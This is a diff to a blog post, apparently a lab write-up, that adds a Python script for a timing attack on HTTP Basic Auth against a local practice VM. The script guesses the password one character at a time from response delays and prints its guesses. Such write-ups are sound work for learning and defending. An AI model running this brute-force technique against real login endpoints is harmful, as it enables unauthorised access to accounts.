@@ -68,6 +68,42 @@ Select one: 4
 {% endhighlight %}
 The format follows "Index password response_time". In the first loop, I sent requests with one character as password. "p" took longer to respond, which indicated that p is likely to be contained in the password. With the correct bit confirmed, we can then test on next bit. To make the script more reliable and stable, it is better to be able to select each character manually, and even go back. It has to stop when it finds the correct password (getting response 200). 
 
+{% highlight python %}
+import requests
+from requests.auth import HTTPBasicAuth
+import time
+
+dict = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
+        'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
+psw = ''
+requests.get('http://192.168.56.101/authentication/example2', auth=HTTPBasicAuth('hacker', 'hacker'))
+psw_found = False
+while True:
+    greatest = 0
+    index = 0
+    for i in range(len(dict)):
+        current_psw = psw + dict[i]
+        start = time.time()
+        r = requests.get('http://192.168.56.101/authentication/example2', auth=('hacker', current_psw))
+        taken = time.time() - start
+        if greatest < taken:
+            greatest = taken
+            index = i
+        print '{0:2d} {1:1s} {2:4f}'.format(i, psw + dict[i], taken)
+        if r.status_code == 200:
+            psw += dict[i]
+            print 'password found: ', str(psw)
+            psw_found = True
+            break
+    if psw_found:
+        break
+    print('--------------------')
+    suggest = index
+    print 'Suggest: ', suggest
+    select = input('Select one: ')
+    psw += dict[select]
+
+{% endhighlight %}
 
 ###Script 
 For this example, I used python to send requests and count time. Requests: HTTP for Humans is an amazing library for HTTP request. You can write extremely simple neat code to send requests with this library. time.time() can be used to measure the response time. Note that time.clock() and time.time() is different. clock() counts the processing time with respect to the CPU clock, while time() counts the local time, including network latency.
